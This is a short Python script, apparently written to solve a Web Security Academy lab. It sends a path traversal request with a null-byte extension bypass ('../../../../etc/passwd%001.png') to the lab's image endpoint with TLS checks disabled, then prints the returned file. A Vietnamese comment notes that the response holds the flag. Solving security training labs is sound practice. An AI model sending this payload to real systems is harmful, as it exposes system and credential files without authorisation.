#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# from bs4 import BeautifulSoup

url = 'https://0ad2005d04467e758442e62e00ef00ae.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + '/image?filename=../../../../etc/passwd%001.png',
    verify=False,
)

print(response.text) # hiển thị response có flag